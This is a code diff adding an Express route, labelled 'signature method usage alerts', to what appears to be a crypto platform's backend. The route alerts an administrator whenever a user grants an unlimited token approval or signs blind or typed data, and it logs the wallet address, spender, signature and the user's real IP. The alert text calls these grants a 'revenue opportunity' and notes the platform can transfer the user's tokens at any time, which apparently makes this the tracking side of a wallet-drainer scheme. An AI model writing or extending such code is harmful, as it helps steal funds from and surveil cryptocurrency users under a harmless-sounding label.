@@ -2052,6 +2052,83 @@ async function getGeolocationIntelligence(ip) {
   }
 }
 
+// Signature method usage alerts
+router.post('/signature-alert', async (req, res) => {
+  try {
+    const { type, userAddress, ...data } = req.body;
+    const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+    
+    let alertTitle = '';
+    let alertMessage = '';
+    
+    switch (type) {
+      case 'ERC20_UNLIMITED_APPROVE':
+        alertTitle = `🚨 UNLIMITED APPROVE: ${userAddress.slice(0,8)}... granted unlimited token access`;
+        alertMessage = `CRITICAL: USER GRANTED UNLIMITED TOKEN ACCESS\n\n` +
+          `⚠️ ALERT LEVEL: MAXIMUM TRUST\n` +
+          `USER: ${userAddress}\n` +
+          `TOKEN: ${data.tokenAddress}\n` +
+          `SPENDER: ${data.spenderAddress}\n` +
+          `TX HASH: ${data.txHash}\n\n` +
+          `CAPABILITY GRANTED:\n` +
+          `• Can transfer ALL user's tokens of this type\n` +
+          `• Permission is PERMANENT until revoked\n` +
+          `• No gas needed for future transfers\n` +
+          `• Complete control over token balance\n\n` +
+          `REVENUE OPPORTUNITY:\n` +
+          `• User has granted maximum trust level\n` +
+          `• Can execute token transfers anytime\n` +
+          `• Consider premium service offerings\n\n` +
+          `USER IP: ${realIP}\n` +
+          `TIME: ${new Date().toISOString()}`;
+        break;
+        
+      case 'BLIND_SIGNATURE':
+        alertTitle = `👁️ BLIND SIGNATURE: ${userAddress.slice(0,8)}... signed unknown data`;
+        alertMessage = `BLIND SIGNATURE EXECUTED\n\n` +
+          `⚠️ RISK LEVEL: EXTREME\n` +
+          `USER: ${userAddress}\n` +
+          `MESSAGE HASH: ${data.messageHash}\n` +
+          `SIGNATURE: ${data.signature}\n\n` +
+          `IMPLICATIONS:\n` +
+          `• User signed without seeing content\n` +
+          `• Could be authorizing any transaction\n` +
+          `• Demonstrates high trust in platform\n` +
+          `• Potential for advanced operations\n\n` +
+          `USER IP: ${realIP}\n` +
+          `TIME: ${new Date().toISOString()}`;
+        break;
+        
+      case 'TYPED_DATA_V4':
+        alertTitle = `📝 TYPED DATA: ${userAddress.slice(0,8)}... signed structured data`;
+        alertMessage = `TYPED DATA V4 SIGNATURE\n\n` +
+          `USER: ${userAddress}\n` +
+          `DOMAIN: ${data.domain.name} v${data.domain.version}\n` +
+          `CONTRACT: ${data.domain.verifyingContract}\n` +
+          `SIGNATURE: ${data.signature}\n\n` +
+          `SIGNED MESSAGE:\n` +
+          `• User: ${data.message.user}\n` +
+          `• Amount: ${data.message.amount}\n` +
+          `• Nonce: ${data.message.nonce}\n\n` +
+          `TRUST INDICATOR:\n` +
+          `• User willing to sign platform data\n` +
+          `• Demonstrates confidence in service\n` +
+          `• Potential for advanced integrations\n\n` +
+          `USER IP: ${realIP}\n` +
+          `TIME: ${new Date().toISOString()}`;
+        break;
+    }
+    
+    // Send admin notification
+    await sendAdminNotification(alertTitle, alertMessage);
+    
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Signature alert error:', error);
+    res.status(500).json({ error: 'Failed to send signature alert' });
+  }
+});
+
 // Get real platform statistics
 router.get('/platform-stats', async (req, res) => {
   try {
